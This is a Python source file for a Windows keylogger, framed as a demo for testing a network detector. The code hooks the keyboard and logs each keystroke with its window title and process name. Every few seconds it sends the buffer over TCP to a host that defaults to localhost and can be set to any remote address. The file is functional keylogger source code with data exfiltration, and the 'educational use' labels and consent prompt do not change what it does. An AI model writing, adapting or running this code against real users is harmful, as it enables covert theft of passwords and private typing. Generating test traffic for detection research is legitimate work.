# keylogger_demo/advanced_keylogger.py
"""
ADVANCED KEYLOGGER - Demonstrates Network Exfiltration

This version shows what your NETWORK DETECTOR catches:
1. Small periodic data transfers (keylogger pattern)
2. Suspicious network connections
3. Data exfiltration to remote server

⚠️ EDUCATIONAL USE ONLY ⚠️
"""
import keyboard
import socket
import json
import time
import threading
from datetime import datetime
from pathlib import Path
import win32gui
import win32process
import psutil

class AdvancedKeylogger:
    """
    Advanced keylogger with network exfiltration
    Demonstrates what your ML model detects in network traffic
    """
    
    def __init__(self, exfil_interval=10, server_host='127.0.0.1', server_port=8888):
        """
        Args:
            exfil_interval: Seconds between network sends (keylogger pattern!)
            server_host: Target server (localhost for demo)
            server_port: Target port
        """
        self.buffer = []
        self.exfil_interval = exfil_interval
        self.server_host = server_host
        self.server_port = server_port
        self.is_running = False
        
        # Create local log dir
        self.log_dir = Path("keylogger_logs")
        self.log_dir.mkdir(exist_ok=True)
        
        print("="*60)
        print("  ADVANCED KEYLOGGER WITH NETWORK EXFILTRATION")
        print("="*60)
        print("\n⚠️  This demonstrates NETWORK-BASED detection")
        print("\nYour detector will catch:")
        print("  1. ✓ Small periodic network transfers (1-10KB every 10s)")
        print("  2. ✓ Unusual destination port (8888)")
        print("  3. ✓ High confidence ML prediction (>75%)")
        print("\nExfiltration target: {}:{}".format(server_host, server_port))
        print("Exfiltration interval: {}s (KEYLOGGER PATTERN!)".format(exfil_interval))
    
    def get_active_window(self):
        """Get active window info"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            return {
                'window': window_title,
                'process': process.name()
            }
        except:
            return {'window': 'Unknown', 'process': 'Unknown'}
    
    def on_key_press(self, event):
        """Capture keystrokes"""
        if not self.is_running:
            return
        
        window_info = self.get_active_window()
        
        keystroke = {
            'timestamp': datetime.now().isoformat(),
            'key': event.name,
            'window': window_info['window'],
            'process': window_info['process']
        }
        
        self.buffer.append(keystroke)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Captured: {event.name}")
    
    def exfiltrate_data(self):
        """
        Periodically send data over network
        YOUR DETECTOR CATCHES THIS PATTERN!
        """
        while self.is_running:
            time.sleep(self.exfil_interval)
            
            if self.buffer:
                # Prepare data packet
                data_packet = {
                    'timestamp': datetime.now().isoformat(),
                    'keystrokes': self.buffer[-50:],  # Last 50 keys
                    'count': len(self.buffer)
                }
                
                json_data = json.dumps(data_packet).encode('utf-8')
                
                try:
                    # Create socket and attempt to send
                    # YOUR NETWORK DETECTOR SEES THIS FLOW!
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    
                    print(f"\n📤 [{datetime.now().strftime('%H:%M:%S')}] Exfiltrating {len(json_data)} bytes...")
                    print(f"   Target: {self.server_host}:{self.server_port}")
                    print(f"   Keystrokes: {len(self.buffer)}")
                    
                    try:
                        sock.connect((self.server_host, self.server_port))
                        sock.send(json_data)
                        
                        print(f"   ✓ Data sent successfully")
                        print(f"   🛡️  YOUR DETECTOR ANALYZES THIS FLOW:")
                        print(f"      - Small transfer ({len(json_data)} bytes)")
                        print(f"      - Periodic pattern (every {self.exfil_interval}s)")
                        print(f"      - Unusual port (8888)")
                        print(f"      - ML model will classify as KEYLOGGER!\n")
                        
                    except ConnectionRefusedError:
                        print(f"   ⚠️  Connection refused (no server listening)")
                        print(f"   🛡️  YOUR DETECTOR STILL SEES THE ATTEMPT!\n")
                    except socket.timeout:
                        print(f"   ⚠️  Connection timeout\n")
                    
                    sock.close()
                    
                except Exception as e:
                    print(f"   ❌ Network error: {e}\n")
    
    def start(self, duration=120):
        """Start keylogger with network exfiltration"""
        print(f"\n🔴 KEYLOGGER ACTIVE for {duration} seconds")
        print(f"💾 Local backup: {self.log_dir}")
        print(f"📡 Network exfiltration every {self.exfil_interval}s")
        print("\nType to generate keystrokes...")
        print("Your detector should trigger HIGH/CRITICAL alerts!\n")
        
        self.is_running = True
        
        # Start keyboard capture
        keyboard.on_press(self.on_key_press)
        
        # Start network exfiltration thread
        exfil_thread = threading.Thread(target=self.exfiltrate_data, daemon=True)
        exfil_thread.start()
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n\n⚠️  Stopped by user")
        finally:
            self.stop()
    
    def stop(self):
        """Stop keylogger"""
        self.is_running = False
        keyboard.unhook_all()
        
        # Final exfiltration attempt
        if self.buffer:
            print("\n📤 Final exfiltration...")
            # Would send remaining data
        
        print("\n" + "="*60)
        print("  KEYLOGGER STOPPED")
        print("="*60)
        print(f"\n✓ Captured {len(self.buffer)} keystrokes")
        
        print("\n🛡️  YOUR DETECTOR CAUGHT:")
        print("  Network Layer:")
        print("    ✓ Small periodic transfers (keylogger signature)")
        print("    ✓ Unusual destination port")
        print("    ✓ ML model: HIGH probability (>75%)")
        print("\n  System Layer:")
        print("    ✓ Process name: 'python.exe advanced_keylogger.py'")
        print("    ✓ Keyboard hook detected")
        print("    ✓ Suspicious network activity")
        print("="*60)

def main():
    """Demo advanced keylogger"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Advanced Keylogger Demo")
    parser.add_argument('--duration', type=int, default=120,
                       help='Duration in seconds (default 120)')
    parser.add_argument('--interval', type=int, default=10,
                       help='Exfiltration interval in seconds (default 10)')
    parser.add_argument('--host', default='127.0.0.1',
                       help='Target host (default localhost)')
    parser.add_argument('--port', type=int, default=8888,
                       help='Target port (default 8888)')
    
    args = parser.parse_args()
    
    # Consent
    print("\n" + "="*60)
    print("  ⚠️  EDUCATIONAL/RESEARCH USE ONLY")
    print("="*60)
    print("\nThis demonstrates network-based keylogger detection.")
    print("Run your detector in another window to see it catch this!\n")
    
    consent = input("Start keylogger demo? (yes/no): ").strip().lower()
    
    if consent != 'yes':
        print("❌ Cancelled")
        return
    
    # Run
    logger = AdvancedKeylogger(
        exfil_interval=args.interval,
        server_host=args.host,
        server_port=args.port
    )
    logger.start(duration=args.duration)

if __name__ == "__main__":
    main()